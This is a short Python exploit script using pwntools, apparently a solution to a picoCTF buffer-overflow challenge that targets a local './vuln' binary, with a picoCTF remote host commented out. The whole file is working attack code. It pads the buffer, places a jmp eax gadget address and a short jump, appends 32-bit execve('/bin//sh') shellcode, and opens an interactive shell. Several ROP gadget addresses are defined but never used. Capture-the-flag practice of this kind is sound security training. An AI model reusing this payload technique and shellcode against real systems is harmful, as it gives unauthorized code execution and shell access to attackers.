from pwn import*

#p = remote("saturn.picoctf.net", 50985)
p = process("./vuln")

#gdb.attach(p, api=True)

ecx = 0x08049e39
eax = 0x080b074a
syscall = 0x0806418d
sh = 0x80c8070
edi = 0x0804b28f		
edx_ebx = 0x080583c9	

jmp_eax = 0x0805334b
shellcode = b"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"	
payload = b"a"*24 + b"\xeb\x08\x00\x00"  + p32(jmp_eax) + shellcode
p.sendline(payload)
p.interactive()
